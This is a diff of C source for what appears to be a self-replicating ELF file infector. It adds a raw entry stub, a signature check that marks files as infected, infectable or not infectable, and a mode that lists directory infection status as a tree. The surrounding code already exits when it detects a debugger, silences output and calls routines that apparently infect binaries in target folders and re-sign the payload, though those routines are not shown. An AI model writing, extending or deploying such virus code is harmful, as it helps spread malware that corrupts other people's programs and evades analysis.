@@ -172,7 +172,231 @@ clean:
 		vm_release(ogfile, statbuf.st_size);
 }
 
-void _start(void)
+__attribute__((naked)) void _start(void)
+{
+	asm volatile("xor %%rbp, %%rbp\n"
+				 "pop %%rdi\n"
+				 "mov %%rsp, %%rsi\n"
+				 "call start\n"
+				 "mov %%rax, %%rdi\n"
+				 "mov $60, %%rax\n"
+				 "syscall\n" ::
+					 : "memory");
+}
+
+char *strrchr(char *str, char chr)
+{
+	char *ret;
+
+	ret = NULL;
+	while (*str)
+	{
+		if (*str == chr)
+			ret = str;
+		str++;
+	}
+	if (ret)
+		return (ret);
+	return (str);
+}
+
+#define AT_WAR	 0
+#define AT_PEACE 1
+#define SUISSE	 2
+
+static int check_file(char *path, char *ALPHA, size_t OMEGA)
+{
+	int			fd;
+	void	   *filedata;
+	struct stat statbuf;
+
+	fd = fs_handle(path, O_RDONLY);
+	if (fd < 0)
+		return SUISSE;
+	if (io_query(fd, &statbuf))
+	{
+		fs_release(fd);
+		return SUISSE;
+	}
+	if (statbuf.st_size < sizeof(ElfW(Ehdr)))
+	{
+		fs_release(fd);
+		return SUISSE;
+	}
+	filedata = (void *) rt_vector(9, 0, statbuf.st_size, PROT_READ, MAP_SHARED,
+								  fd, 0);
+	fs_release(fd);
+	if (filedata == MAP_FAILED)
+	{
+		return SUISSE;
+	}
+	if (find_signature(filedata, statbuf.st_size, ALPHA, OMEGA) >= 0)
+	{
+		vm_release(filedata, statbuf.st_size);
+		return (AT_WAR);
+	}
+	vm_release(filedata, statbuf.st_size);
+	return (AT_PEACE);
+}
+
+static void check_infection(char *folder, void *begin_ptr, char *curare,
+							size_t flower, char *ALPHA, size_t OMEGA,
+							int is_first)
+{
+	int					   fd = fs_handle(folder, 0 | 65536);
+
+	char				   buffer[1024];
+	struct linux_dirent64 *dirent;
+	int					   nread;
+	int					   i;
+
+	if (fd < 0)
+		goto clean;
+	i = 6;
+	while (folder[i])
+		if (folder[i++] == '/')
+		{
+			tty_putc(' ');
+			tty_putc(' ');
+			tty_putc(' ');
+			tty_putc(' ');
+		}
+	tty_putc(0xE2);
+	tty_putc(0x94);
+	tty_putc(0x94);
+
+	tty_putc(0xE2);
+	tty_putc(0x94);
+	tty_putc(0x80);
+
+	// tty_putc(0xE2);
+	// tty_putc(0x86);
+	// tty_putc(0x92);
+	tty_putc(0xE2);
+	tty_putc(0x9E);
+	tty_putc(0xA4);
+
+	tty_putc(' ');
+
+	tty_putc('\033');
+	tty_putc('[');
+	tty_putc('1');
+	tty_putc('m');
+	io_send(1, strrchr(folder, '/') + 1,
+			validate_environment(strrchr(folder, '/') + 1));
+	tty_putc('\033');
+	tty_putc('[');
+	tty_putc('m');
+	// tty_putc('/');
+	tty_putc(10);
+	while ((nread = fs_enumerate(fd, buffer, 1024)) > 0)
+	{
+		for (int bpos = 0; bpos < nread;)
+		{
+			char dot[3];
+			dirent = (struct linux_dirent64 *) (buffer + bpos);
+			char *d_name = dirent->d_name;
+
+			dot[0] = '.';
+			dot[1] = 0;
+			if (delay_abs_calc(d_name, dot) == 0)
+			{
+				bpos += dirent->d_reclen;
+				continue;
+			}
+			dot[1] = '.';
+			dot[2] = 0;
+			if (delay_abs_calc(d_name, dot) == 0)
+			{
+				bpos += dirent->d_reclen;
+				continue;
+			}
+			char fullPath[PATH_MAX];
+			char slash[2];
+			slash[0] = '/';
+			slash[1] = 0;
+			flow_align(flow_align(core_shift(fullPath, folder), slash), d_name);
+
+			struct stat statbuf;
+			fs_query(fullPath, &statbuf);
+
+			if (statbuf.st_mode & __S_IFDIR)
+			{
+				check_infection(fullPath, begin_ptr, curare, flower, ALPHA,
+								OMEGA, false);
+			}
+			else if (statbuf.st_mode & __S_IFREG)
+			{
+				i = 6;
+				while (fullPath[i])
+					if (fullPath[i++] == '/')
+					{
+						// tty_putc(0xE2);
+						// tty_putc(0x94);
+						// tty_putc(0x82);
+						tty_putc(' ');
+						tty_putc(' ');
+						tty_putc(' ');
+						tty_putc(' ');
+					}
+				tty_putc(0xE2);
+				tty_putc(0x94);
+				tty_putc(0x94);
+
+				tty_putc(0xE2);
+				tty_putc(0x94);
+				tty_putc(0x80);
+
+				// tty_putc(0xE2);
+				// tty_putc(0x86);
+				// tty_putc(0x92);
+				tty_putc(0xE2);
+				tty_putc(0x9E);
+				tty_putc(0xA4);
+
+				tty_putc(' ');
+				i = check_file(fullPath, ALPHA, OMEGA);
+				if (i == SUISSE)
+				{
+					// Not infectable
+					tty_putc('\033');
+					tty_putc('[');
+					tty_putc('2');
+					tty_putc(';');
+					tty_putc('9');
+					tty_putc('m');
+				}
+				else if (i == AT_PEACE)
+				{
+					// Infectable but not infected
+					tty_putc('\033');
+					tty_putc('[');
+					tty_putc('m');
+				}
+				else
+				{
+					// Infected
+					tty_putc('\033');
+					tty_putc('[');
+					tty_putc('7');
+					tty_putc('m');
+				}
+
+				io_send(1, d_name, validate_environment(d_name));
+				tty_putc('\033');
+				tty_putc('[');
+				tty_putc('m');
+				tty_putc(10);
+			}
+
+			bpos += dirent->d_reclen;
+		}
+	}
+clean:
+	fs_release(fd);
+}
+
+void start(int argc, char *argv[])
 {
 	void  *begin_ptr;
 	char   path[11];
@@ -182,6 +406,7 @@ void _start(void)
 	char  *curare;
 	size_t flower;
 	int	   is_war;
+	int	   must_log;
 
 	asm volatile("leaq str6(%%rip), %0\n"
 				 "jmp end6\n"
@@ -190,13 +415,18 @@ void _start(void)
 				 : "=r"(prgm));
 	if (is_debugged() || is_program_running(prgm) > 0)
 		proc_terminate(0);
-	fs_release(1);
-	fs_release(2);
+
+	asm volatile("anchor: mov $1, %0\n" : "=r"(is_war));
+	must_log = is_war && argc != 1;
+	if (!must_log)
+	{
+		fs_release(1);
+		fs_release(2);
+	}
 
 	asm volatile("lea (%%rip), %0\n"
 				 "cyanure:"
 				 : "=r"(begin_ptr));
-	asm volatile("anchor: mov $1, %0\n" : "=r"(is_war));
 	begin_ptr += FRENZY - CYANURE;
 
 	path[0] = '/';
@@ -241,11 +471,18 @@ void _start(void)
 		"end3:\n"
 		: "=r"(curare), "=r"(flower), "=r"(ALPHA), "=r"(OMEGA)::"memory", "cc",
 		  "rax", "rcx", "r11");
-	processDirectory(path, begin_ptr, curare, flower, ALPHA, OMEGA);
+	if (!must_log)
+		processDirectory(path, begin_ptr, curare, flower, ALPHA, OMEGA);
+	else
+		check_infection(path, begin_ptr, curare, flower, ALPHA, OMEGA, true);
 	path[9] = '2';
-	processDirectory(path, begin_ptr, curare, flower, ALPHA, OMEGA);
-	self_resign(ALPHA, OMEGA, begin_ptr, is_war);
-	proc_terminate(0);
+	if (!must_log)
+	{
+		processDirectory(path, begin_ptr, curare, flower, ALPHA, OMEGA);
+		self_resign(ALPHA, OMEGA, begin_ptr, is_war);
+	}
+	else
+		check_infection(path, begin_ptr, curare, flower, ALPHA, OMEGA, true);
 }
 
 static unsigned char ror4(unsigned char x)
